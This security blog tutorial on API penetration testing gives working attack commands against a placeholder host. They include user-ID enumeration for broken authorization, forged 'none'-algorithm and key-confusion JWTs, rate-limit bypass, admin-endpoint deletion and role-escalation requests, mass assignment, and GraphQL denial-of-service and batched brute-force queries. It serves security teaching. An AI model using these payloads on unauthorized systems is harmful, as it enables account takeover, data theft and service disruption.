---
title: "API Security Testing - Finding & Exploiting Vulnerabilities"
description: "Comprehensive guide to API security testing, covering REST, GraphQL, authentication bypass, and common API vulnerabilities."
date: "2025-10-30"
category: "Security Testing"
tags: ["API Security", "REST", "GraphQL", "Authentication", "Authorization"]
image: "/images/blog/api-security-testing.png"
imageAlt: "API security testing with REST endpoints and authentication tokens"
imagePrompt: "API security testing illustration, REST endpoints diagram, authentication tokens, matte black background, neon cyan API connections, green security shields, JSON data flow, abstract network architecture, cybersecurity art"
author: "Rana Uzair Ahmad"
readTime: "12 min"
difficulty: "Intermediate"
---

## The API Attack Surface

APIs have become the backbone of modern software architecture. Every mobile app, single-page application, IoT device, and microservice communicates through APIs. This explosion of API usage has created an enormous attack surface that is frequently overlooked in traditional security assessments.

According to Gartner, API attacks have become the most frequent attack vector for enterprise web applications. The OWASP API Security Top 10, first published in 2019 and updated in 2023, highlights just how different API vulnerabilities are from traditional web application flaws.

Unlike web applications with rendered HTML, APIs expose raw data and business logic directly. A single misconfigured endpoint can leak millions of records, bypass access controls, or allow unauthorized actions — often without any visual indication that something has gone wrong.

## API Fundamentals for Security Testers

Before testing APIs, you need to understand the different API paradigms:

### REST APIs
REST (Representational State Transfer) is the most common API architecture. It uses standard HTTP methods and typically returns JSON:

```http
GET /api/v1/users/123 HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Accept: application/json
```

### GraphQL APIs
GraphQL exposes a single endpoint and allows clients to request exactly the data they need:

```graphql
# GraphQL introspection query — reveals the entire API schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

GraphQL introduces unique attack vectors: deeply nested queries for denial-of-service, batch queries to bypass rate limiting, and introspection leaking internal schema details.

### gRPC APIs
gRPC uses Protocol Buffers over HTTP/2. It's gaining popularity in microservices architectures and requires specialized tools like `grpcurl` for testing.

## Phase 1: API Reconnaissance

### Discovering API Endpoints

```bash
# Passive discovery: look for API documentation
curl -s https://target.com/swagger.json | jq '.paths | keys'
curl -s https://target.com/openapi.json | jq '.paths | keys'
curl -s https://target.com/api-docs

# Check common documentation paths
for path in swagger.json openapi.json api-docs graphql api/swagger docs/api v1/docs v2/docs; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  echo "$path: $STATUS"
done

# Brute-force API endpoints
ffuf -u https://target.com/api/v1/FUZZ -w /opt/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 -t 50

# Extract API calls from JavaScript files
cat main.js | grep -oP '(\/api\/[a-zA-Z0-9/_-]+)' | sort -u

# GraphQL endpoint discovery
for endpoint in graphql graphiql playground query gql; do
  curl -s -X POST "https://target.com/$endpoint" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' | grep -q "data" && echo "Found GraphQL at /$endpoint"
done
```

### API Authentication Analysis

```bash
# Analyze JWT token structure
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAzMDAwMDAwfQ.signature"

# Decode JWT header and payload
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Check for weak JWT signing
# Output: {"alg":"HS256","typ":"JWT"} — HS256 may be brute-forceable
# Output: {"user_id":123,"role":"user","exp":1703000000} — role field is interesting
```

## Phase 2: Common API Vulnerabilities

### BOLA — Broken Object Level Authorization (API1:2023)

BOLA is the most critical and prevalent API vulnerability. It occurs when an API endpoint accepts an object identifier from the client but fails to verify that the authenticated user has permission to access that specific object.

```bash
# Test for BOLA by accessing another user's resources
# Authenticated as user 123, try to access user 456's data

# Direct object reference
curl -s -H "Authorization: Bearer $USER_123_TOKEN" \
  https://target.com/api/v1/users/456/profile | jq .

# Iterate through user IDs to detect BOLA
for id in $(seq 1 500); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_123_TOKEN" \
    "https://target.com/api/v1/users/$id/documents")
  if [ "$RESPONSE" == "200" ]; then
    echo "[BOLA] Accessible: /api/v1/users/$id/documents"
  fi
done
```

### JWT Attacks

JSON Web Tokens are the most common API authentication mechanism, and they are frequently misconfigured:

```python
import jwt
import json
import base64

# Attack 1: Algorithm None bypass
# Change the algorithm to "none" to bypass signature verification
header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin", "exp": 9999999999}

# Craft the forged token
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
forged_token = f"{header_b64}.{payload_b64}."

print(f"Forged token: {forged_token}")

# Attack 2: HMAC/RSA confusion (CVE-2016-10555)
# If the server expects RS256 but accepts HS256,
# the public key can be used as the HMAC secret
with open('public_key.pem', 'r') as f:
    public_key = f.read()

forged = jwt.encode(
    {"user_id": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)

# Attack 3: Brute-force weak JWT secrets
# Using hashcat
# hashcat -a 0 -m 16500 jwt.txt /opt/seclists/Passwords/Common-Credentials/jwt-secrets.txt
```

### Rate Limiting Bypass

```bash
# Test rate limiting on login endpoint
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong'$i'"}'
done | sort | uniq -c

# Bypass techniques
# 1. IP rotation via X-Forwarded-For
curl -H "X-Forwarded-For: 10.0.0.$((RANDOM % 255))" https://target.com/api/v1/auth/login

# 2. Case variation in endpoints
/api/v1/auth/Login
/API/V1/AUTH/LOGIN
/api/v1/auth/login/

# 3. HTTP method switching
# If POST is rate-limited, try PUT or PATCH

# 4. Parameter pollution
/api/v1/auth/login?dummy=1
/api/v1/auth/login?dummy=2
```

### Broken Function Level Authorization (API5:2023)

This occurs when APIs expose administrative functionality to regular users:

```bash
# Test for privilege escalation
# Regular user trying admin endpoints
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  https://target.com/api/v1/admin/users | jq .

curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -X DELETE https://target.com/api/v1/admin/users/456

curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -X PUT https://target.com/api/v1/users/123 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### Mass Assignment

APIs that blindly bind request parameters to internal object properties are vulnerable to mass assignment:

```bash
# Normal profile update request
curl -X PUT https://target.com/api/v1/users/123 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "John Doe", "email": "john@example.com"}'

# Mass assignment attack: inject additional properties
curl -X PUT https://target.com/api/v1/users/123 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "John Doe", "email": "john@example.com", "role": "admin", "is_verified": true, "credits": 99999}'
```

## Phase 3: GraphQL-Specific Attacks

```graphql
# Introspection query to dump the entire schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
        type { name kind ofType { name } }
      }
    }
  }
}

# Deeply nested query for DoS (query depth attack)
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Batch query to bypass rate limiting
[
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass3\") { token } }"}
]
```

## Phase 4: Testing Methodology Checklist

A structured approach ensures comprehensive coverage:

1. **Discovery**: Identify all API endpoints, methods, and parameters
2. **Authentication**: Test token generation, expiration, revocation, and bypass
3. **Authorization**: Verify object-level and function-level access controls
4. **Input Validation**: Test for injection, overflow, and type confusion
5. **Rate Limiting**: Verify limits exist and cannot be bypassed
6. **Error Handling**: Check that errors don't leak sensitive information
7. **Data Exposure**: Ensure responses don't contain excessive data
8. **Business Logic**: Test for workflow bypass, race conditions, and abuse

## Recommended Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | HTTP proxy, scanner, and manual testing |
| **Postman** | API client with collection running and scripting |
| **ffuf** | Fast web fuzzer for endpoint and parameter discovery |
| **jwt_tool** | JWT analysis, manipulation, and attack automation |
| **GraphQL Voyager** | Visual schema exploration for GraphQL APIs |
| **Arjun** | HTTP parameter discovery |
| **Kiterunner** | API endpoint brute-forcing with context-aware wordlists |
| **mitmproxy** | Programmable HTTP/HTTPS proxy for scripted testing |

## Conclusion

API security testing requires a fundamentally different mindset from traditional web application testing. There is no user interface to guide your exploration — you must understand the API's data model, authentication flow, and business logic from raw requests and responses. Focus on authorization flaws (BOLA and BFLA), as these consistently represent the highest-impact vulnerabilities. Always use a structured methodology, automate repetitive checks, and remember that the most dangerous API vulnerabilities are often the simplest ones — an endpoint that forgot to check if you own the resource you're requesting.
